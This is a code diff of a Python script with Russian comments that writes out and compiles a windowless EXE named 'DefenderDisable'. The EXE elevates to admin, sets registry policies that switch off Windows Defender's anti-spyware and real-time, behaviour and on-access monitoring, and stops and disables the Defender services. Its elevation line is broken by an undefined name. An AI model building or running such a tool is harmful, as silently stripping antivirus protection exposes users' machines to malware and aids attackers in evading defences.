@@ -8,21 +8,17 @@ def install_pyinstaller():
     except ImportError:
         subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
 
-def create_gpo_opener():
+def create_gpo_simple():
     gpo_code = '''import os
 import subprocess
 import time
 import ctypes
-import win32gui
-import win32con
-import win32api
-import pyautogui
 
 def run_as_admin():
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
             return True
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, file, None, 1)
         return False
     except:
         return False
@@ -32,92 +28,44 @@ if not run_as_admin():
 
 time.sleep(1)
 
-# Сначала устанавливаем настройку через реестр
-subprocess.run('reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f', shell=True)
+# 1. Устанавливаем настройку через реестр (это работает как групповые политики)
+commands = [
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f',
+    
+    # Останавливаем службы
+    'sc stop WinDefend',
+    'sc config WinDefend start= disabled',
+    'sc stop WdNisSvc',
+    'sc config WdNisSvc start= disabled',
+    
+    # Обновляем политики
+    'gpupdate /force'
+]
 
-# Открываем редактор локальной групповой политики
-subprocess.run('gpedit.msc', shell=True)
-time.sleep(3)
+for cmd in commands:
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        print(f"Executed: {cmd}")
+        time.sleep(0.5)
+    except Exception as e:
+        print(f"Error: {e}")
 
-# Автоматизируем навигацию с помощью горячих клавиш
-def set_gpo_settings():
-    # Переходим по дереву групповых политик
-    pyautogui.hotkey('right')  # Разворачиваем первый узел
-    time.sleep(0.5)
-    
-    # Конфигурация компьютера
-    pyautogui.press('down')
-    time.sleep(0.5)
-    pyautogui.hotkey('right')
-    time.sleep(0.5)
-    
-    # Административные шаблоны
-    pyautogui.press('down')
-    time.sleep(0.5)
-    pyautogui.hotkey('right')
-    time.sleep(0.5)
-    
-    # Компоненты Windows
-    pyautogui.press('down')
-    time.sleep(0.5)
-    pyautogui.hotkey('right')
-    time.sleep(0.5)
-    
-    # Антивирусная программа «Защитник Windows»
-    pyautogui.press('down')
-    pyautogui.press('down')
-    pyautogui.press('down')
-    pyautogui.press('down')
-    pyautogui.press('down')  # Прокручиваем до Защитника
-    time.sleep(0.5)
-    pyautogui.press('enter')  # Открываем раздел
-    time.sleep(1)
-    
-    # Ищем пункт «Выключить антивирусную программу „Защитник Windows“»
-    pyautogui.press('tab')  # Переходим к списку политик
-    time.sleep(0.5)
-    
-    # Прокручиваем до нужной политики
-    for i in range(10):
-        pyautogui.press('down')
-        time.sleep(0.1)
-    
-    # Открываем политику двойным кликом или Enter
-    pyautogui.press('enter')
-    time.sleep(1)
-    
-    # Выбираем «Включено»
-    pyautogui.press('down')
-    time.sleep(0.5)
-    pyautogui.press('down')  # Переходим на "Включено"
-    time.sleep(0.5)
-    
-    # Применяем настройку
-    pyautogui.press('enter')
-    time.sleep(1)
-    
-    # Закрываем редактор групповых политик
-    pyautogui.hotkey('alt', 'f4')
-
-try:
-    set_gpo_settings()
-    print("Group Policy settings configured successfully")
-except Exception as e:
-    print(f"Error: {e}")
-
-# Принудительно обновляем групповые политики
-subprocess.run('gpupdate /force', shell=True)
-print("Group policies updated")
+print("Windows Defender disabled via registry policies")
+print("Settings will persist after reboot")
 '''
 
-    with open('gpo_auto_config.py', 'w', encoding='utf-8') as f:
+    with open('simple_defender_disable.py', 'w', encoding='utf-8') as f:
         f.write(gpo_code)
 
 def compile_to_exe():
-    os.system('pyinstaller --onefile --noconsole --name "GPOAutoConfig" gpo_auto_config.py')
-    print("EXE создан: GPOAutoConfig.exe")
+    os.system('pyinstaller --onefile --noconsole --name "DefenderDisable" simple_defender_disable.py')
+    print("EXE создан: DefenderDisable.exe")
 
 if __name__ == "__main__":
     install_pyinstaller()
-    create_gpo_opener()
+    create_gpo_simple()
     compile_to_exe()
